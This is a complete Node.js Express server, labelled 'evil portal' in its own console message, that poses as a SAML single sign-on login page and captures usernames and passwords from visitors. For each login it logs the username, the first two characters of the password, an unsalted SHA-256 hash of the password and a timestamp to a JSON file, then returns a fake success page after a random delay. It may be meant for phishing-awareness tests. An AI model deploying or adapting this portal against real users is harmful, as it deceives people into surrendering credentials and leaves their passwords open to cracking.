import fsp from 'node:fs/promises'
import express from 'express'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

// Try to import crypto with graceful fallback
let crypto
let cryptoAvailable = false
try {
    crypto = await import('node:crypto')
    cryptoAvailable = true
    console.log('✓ node:crypto available - SHA256 hashing enabled')
} catch (error) {
    console.log(
        '⚠ node:crypto not available - storing passwords without hashing'
    )
}

const DB_FILE = './logins.json'
await fsp.writeFile(DB_FILE, '[]')

let data = JSON.parse(await fsp.readFile(DB_FILE))

const app = express()

// Helper function to hash password if crypto is available
const hashPassword = (password) =>
    cryptoAvailable
        ? crypto.createHash('sha256').update(password).digest('hex')
        : null // No hashing available

// static files (HTML, CSS)
app.get('/', (req, res) => res.redirect('/idp/profile/SAML2/Redirect/SSO'))
app.use('/idp/profile/SAML2/Redirect/SSO', express.static('public'))
app.use(express.urlencoded({ extended: true }))

// handle login
app.post('/login', async (req, res) => {
    const { username, password } = req.body
    const maskedPassword = `${password.slice(0, 2)}...`
    const passwordHash = hashPassword(password)

    // Prepare data object
    const loginEntry = {
        username,
        maskedPassword,
        timestamp: new Date().toISOString()
    }

    // Add hash if available
    if (passwordHash) {
        loginEntry.passwordSha256 = passwordHash
    }

    console.log(loginEntry)
    data = [...data, loginEntry]
    await fsp.writeFile(DB_FILE, JSON.stringify(data, null, 2))

    // generate random delay between 800 and 1200 ms
    const delay = Math.floor(Math.random() * 401) + 800
    await new Promise((res) => setTimeout(res, delay)) // simulate delay
    res.sendFile(
        path.join(
            path.dirname(fileURLToPath(import.meta.url)),
            'public',
            'success.html'
        )
    )
})

app.listen(8080, () => console.log('evil portal on port 8080'))
